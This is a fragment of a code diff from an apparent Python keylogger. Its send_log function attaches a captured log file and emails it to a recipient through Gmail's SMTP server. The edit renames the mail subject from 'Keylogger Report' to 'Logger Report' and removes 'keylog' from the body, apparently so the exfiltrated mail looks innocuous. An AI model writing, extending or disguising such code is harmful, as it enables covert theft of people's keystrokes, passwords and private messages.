@@ -55,13 +55,13 @@ def send_log():
         return
 
     msg = EmailMessage()
-    msg['Subject'] = 'Keylogger Report'
+    msg['Subject'] = 'Logger Report'
     msg['From'] = EMAIL_ADDRESS
     msg['To'] = RECIPIENT_EMAIL
 
     with open(log_file, 'rb') as f:
         file_data = f.read()
-        msg.set_content("Attached is the latest keylog.")
+        msg.set_content("Attached is the latest logs.")
         msg.add_attachment(file_data, maintype='text', subtype='plain', filename='hostlog.txt')
 
     with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
